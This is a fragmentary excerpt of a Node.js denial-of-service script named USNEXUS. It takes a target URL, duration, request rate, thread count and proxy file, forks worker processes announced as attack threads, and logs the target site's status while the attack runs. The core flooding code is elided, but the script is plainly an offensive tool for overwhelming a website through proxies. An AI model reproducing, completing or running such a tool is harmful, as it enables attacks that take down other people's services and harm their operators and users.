//npm i net http2 tls cluster url crypto user-agents fs header-generator fake-useragent axios
 ...
 if (process.argv.length < 7){console.log(`node USNEXUS.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
⠀⠀
`);
  console.log(`\x1b[96mUSNEXUS\x1b[0m`);
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[35mUSNEXUS\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
